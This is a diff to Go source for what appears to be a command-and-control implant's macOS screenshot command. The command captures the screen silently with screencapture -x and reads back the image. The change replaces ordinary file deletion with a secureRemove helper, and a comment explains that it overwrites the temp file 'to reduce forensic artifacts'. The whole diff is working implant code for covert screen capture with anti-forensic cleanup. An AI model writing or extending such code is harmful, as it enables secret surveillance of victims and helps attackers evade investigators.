@@ -33,19 +33,19 @@ func (c *ScreenshotDarwinCommand) Execute(task structs.Task) structs.CommandResu
 	// Use screencapture: -x = no sound, -t png = PNG format
 	if output, err := execCmdTimeout("screencapture", "-x", "-t", "png", tmpFile); err != nil {
 		// Clean up on failure
-		os.Remove(tmpFile)
+		secureRemove(tmpFile)
 		return errorf("Error capturing screenshot: %v\n%s", err, string(output))
 	}
 
 	// Read the screenshot file
 	imgData, err := os.ReadFile(tmpFile)
 	if err != nil {
-		os.Remove(tmpFile)
+		secureRemove(tmpFile)
 		return errorf("Error reading screenshot file: %v", err)
 	}
 
-	// Clean up temp file
-	os.Remove(tmpFile)
+	// Clean up temp file — overwrite before removal to reduce forensic artifacts
+	secureRemove(tmpFile)
 
 	if len(imgData) == 0 {
 		return errorResult("Screenshot captured but file was empty (no display available?)")
